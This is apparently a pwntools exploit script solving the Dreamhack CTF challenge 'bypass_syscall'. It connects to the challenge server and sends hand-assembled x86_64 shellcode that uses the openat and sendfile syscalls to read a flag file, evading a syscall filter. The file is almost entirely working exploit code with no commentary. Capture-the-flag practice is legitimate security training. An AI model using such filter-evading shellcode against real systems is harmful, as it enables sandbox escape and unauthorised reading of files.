from pwn import *

# p = process('./bypass_syscall')
p = remote('host3.dreamhack.games', 22430)

context.arch = 'x86_64'
# gdb.attach(p, gdbscript= '''
#            b*main+154
#            c
#            ''')
shellcode = asm("""
                push 0x67
                mov rax, 0x616c662f6c6c6163
                push rax
                mov rax, 0x7379735f73736170
                push rax
                mov rax, 0x79622f656d6f682f
                push rax
                
                mov rsi, rsp
                xor rdi, rdi
                xor rdx, rdx
                mov rax, 0x101
                syscall
                
                mov rdi, 0x1
                mov r10, 0x64
                xor edx, edx
                mov rsi, rax
                mov rax, 0x28
                syscall
                
                """)

# shellcode = shellcraft.openat(0,'/home/bypass_syscall/flag')
# shellcode += shellcraft.sendfile(1,'rax',0,100)

p.sendlineafter(b': ', (shellcode))
p.interactive()
